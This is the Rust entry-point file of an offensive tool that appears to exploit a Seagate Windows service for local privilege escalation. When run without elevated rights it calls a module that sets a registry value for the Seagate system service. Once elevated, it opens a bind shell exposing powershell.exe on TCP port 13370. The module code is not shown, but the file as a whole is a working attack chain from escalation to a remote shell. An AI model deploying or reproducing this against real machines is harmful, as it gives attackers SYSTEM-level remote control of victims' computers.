use std::error::Error;

mod bind_shell;
mod privileges;
mod seagate;

/// ============================================================================
/// Config
const REG_KEY: &str = "pwn_seagate";
const CMD: &str = "powershell.exe";
const PORT: u16 = 13370;
/// ============================================================================

#[tokio::main]
pub async fn main() -> Result<(), Box<dyn Error>> {
    if privileges::is_elevated() {
        if let Err(e) = bind_shell::run_server_bind_shell(PORT, CMD) {
            eprintln!("{e}");
        };
    }
    else {
        if let Err(e) = seagate::set_registry_system_service(REG_KEY).await {
            eprintln!("{e}");
        };
    }

    Ok(())
}
